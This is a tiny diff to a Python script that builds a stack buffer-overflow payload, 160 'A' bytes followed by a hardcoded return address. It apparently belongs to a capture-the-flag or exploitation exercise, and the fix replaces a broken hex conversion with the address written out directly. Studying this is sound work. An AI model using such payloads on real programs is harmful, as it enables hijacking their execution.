@@ -1,4 +1,1 @@
-s = 'A' * 160
-retaddr = 86850408
-s += bytes.fromhex(retaddr).decode("ascii")
-print(s)
+print('A' * 160 + "\x86\x85\x04\x08")
